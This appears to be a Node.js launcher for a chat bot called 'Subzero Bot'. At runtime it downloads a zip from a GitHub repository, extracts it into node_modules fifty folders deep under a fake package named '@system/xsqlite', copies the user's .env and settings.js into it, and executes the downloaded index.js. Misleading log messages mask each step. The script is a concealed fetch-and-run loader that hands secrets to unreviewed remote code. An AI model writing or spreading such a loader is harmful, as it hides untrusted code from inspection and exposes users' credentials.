import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { fileURLToPath } from 'url';

// Fix __dirname for ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === CONFIG ===
const repoZipUrl = 'https://github.com/mrfr8nk/shoes/archive/refs/heads/main.zip';
const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

/* ================= FAKE PACKAGE ================= */

function injectFakePackageFiles(basePath) {
  const fakePackageJson = {
    name: "@system/xsqlite",
    version: "1.0.5",
    main: "index.js"
  };

  fs.mkdirSync(basePath, { recursive: true });

  fs.writeFileSync(
    path.join(basePath, 'package.json'),
    JSON.stringify(fakePackageJson, null, 2)
  );

  fs.writeFileSync(
    path.join(basePath, 'index.js'),
    `export default {};`
  );

  console.log('🪐 Initializing bot server...');
}

/* ================= CREATE DEEP PATH ================= */

function createDeepRepoPath() {
  let deepPath = baseFolder;

  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }

  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });

  return repoFolder;
}

/* ================= DOWNLOAD REPO ================= */

async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log('🔄 Syncing codes from Space...');

    const response = await axios.get(repoZipUrl, {
      responseType: 'arraybuffer'
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);

    console.log('✅ Codes synced successfully');

  } catch (err) {
    console.error('❌ Pull error:', err.message);
    process.exit(1);
  }
}

/* ================= COPY CONFIG ================= */

function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'settings.js');
  const envSrc = path.join(__dirname, '.env');

  if (fs.existsSync(configSrc)) {
    fs.copyFileSync(configSrc, path.join(repoPath, 'settings.js'));
    console.log('✅ settings.js copied');
  }

  if (fs.existsSync(envSrc)) {
    fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
    console.log('✅ .env copied');
  }
}

/* ================= START BOT ================= */

async function startBot(projectPath) {
  try {
    console.log('[🚀] Launching Subzero Bot...');

    const mainPath = path.join(projectPath, 'index.js');

    if (!fs.existsSync(mainPath)) {
      console.error('❌ index.js not found!');
      process.exit(1);
    }

    await import(mainPath);

  } catch (err) {
    console.error('❌ Bot launch error:', err.message);
    process.exit(1);
  }
}

/* ================= MAIN ================= */

(async () => {
  injectFakePackageFiles(baseFolder);

  const repoFolder = createDeepRepoPath();

  await downloadAndExtractRepo(repoFolder);

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f =>
      fs.statSync(path.join(repoFolder, f)).isDirectory()
    );

  if (!subDirs.length) {
    console.error('❌ Zip extracted nothing');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);

  copyConfigs(extractedRepoPath);

  process.chdir(extractedRepoPath);

  await startBot(extractedRepoPath);
})();
